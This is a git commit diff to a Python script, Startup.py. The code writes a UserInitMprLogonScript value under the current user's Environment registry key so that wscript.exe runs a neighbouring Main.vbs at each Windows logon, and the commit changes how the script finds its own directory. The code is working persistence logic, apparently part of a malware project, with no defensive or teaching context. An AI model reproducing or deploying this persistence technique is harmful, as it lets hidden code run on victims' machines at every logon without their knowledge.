a3683706bea2ad5597314d4ec34a8bd318de21a4
UQABXO <92090431+UQABXO@users.noreply.github.com>
2022-04-06 12:57:41 +0300

    Update Startup.py

--- Startup.py
+++ Startup.py
@@ -2,10 +2,11 @@ import os
 from _winreg import *
 class Startup():
 	def __init__(self):
+		self.__file__ = _.__file__
 		self.Main()
 
 	def Main(self):
-		dirname = "\\".join(os.path.abspath(__file__).split("\\")[:-1])
+		dirname = "\\".join(os.path.abspath(self.__file__).split("\\")[:-1])
 		root_key=OpenKey(HKEY_CURRENT_USER, r'Environment', 0, KEY_WRITE)
 		SetValueEx(root_key,"UserInitMprLogonScript",0,REG_SZ,"wscript.exe " + dirname + "\\Main.vbs")
 		CloseKey(root_key)
